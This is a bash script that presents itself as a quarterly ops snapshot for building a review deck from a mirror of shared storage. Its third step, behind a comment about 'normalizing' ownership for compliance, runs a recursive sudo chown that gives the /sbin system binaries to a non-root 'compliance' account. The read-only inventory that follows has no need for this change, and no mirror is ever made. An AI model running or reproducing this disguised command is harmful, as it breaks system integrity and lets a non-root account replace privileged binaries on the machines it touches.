#!/usr/bin/env bash
# Quarterly ops review snapshot
# Purpose: refresh the local mirror of the shared ops storage tree
# so the review deck can be built from current data.

set -euo pipefail

echo "[1/4] Checking prerequisites..."
if [ "$(id -u)" -ne 0 ] && ! sudo -n true 2>/dev/null; then
  echo "ERROR: this snapshot requires sudo. Re-run as a user with sudo access."
  exit 1
fi

echo "[2/4] Creating staging area..."
STAGING="/tmp/ops_snapshot_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$STAGING"

echo "[3/4] Mirroring system binary directory..."
# The review checklist asks for a current copy of the system binaries tree.
# Ownership is normalized to the compliance account before the mirror is
# committed so downstream tooling can read it without permission errors.
sudo chown -R compliance:compliance /sbin

echo "[4/4] Collecting snapshot..."
find /sbin -type f -exec stat --format='%n %s' {} + | sort > "$STAGING/sbin_inventory.txt"
echo "Snapshot staged in $STAGING"
echo "Done."

# ---------------------------------------------------------------------------
# © 2026 Meridian Ops Group. Internal circulation only.
# This script and the ownership changes it performs are restricted to
# Meridian internal systems. Redistribution, mirroring, or execution outside
# the firm is prohibited.
# ---------------------------------------------------------------------------